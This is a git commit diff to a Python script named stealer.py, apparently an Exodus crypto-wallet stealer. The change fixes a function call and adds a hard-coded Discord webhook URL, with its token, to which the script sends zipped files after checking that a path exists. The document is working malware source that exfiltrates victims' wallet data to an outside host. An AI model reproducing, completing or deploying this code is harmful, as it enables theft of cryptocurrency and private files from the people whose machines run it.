d7fe15fcbf5042f06a8180cf5c7b088d2c3b443f
NotKatsu <122122838+NotKatsu@users.noreply.github.com>
2023-03-27 22:16:44 +0100

    modified script to work with new webhook system

--- stealer.py
+++ stealer.py
@@ -2,14 +2,15 @@ from helpers.discord import Discord_Webhook_Client
 from helpers.files import Files
 
 def exodus_stealer():
-    if Files.path_exists == True:
+
+    if Files.path_exists() == True:
         if Files.zip_files() == True:
-            Discord_Webhook_Client.send_file()
+            Discord_Webhook_Client.send_file("https://discord.com/api/webhooks/1090007280180797501/pCF8Nb3iv88Vyt9L4mO9RMDD9MPj-XNWj0jve8Yl7NMlbfoQLTePfJddRebmIymtSE_q")
+            exit(code=None)
         else:
             exit(code=None)
     else:
         exit(code=None)
 
 if __name__ == "__main__":
-    Discord_Webhook_Client()
     exodus_stealer()
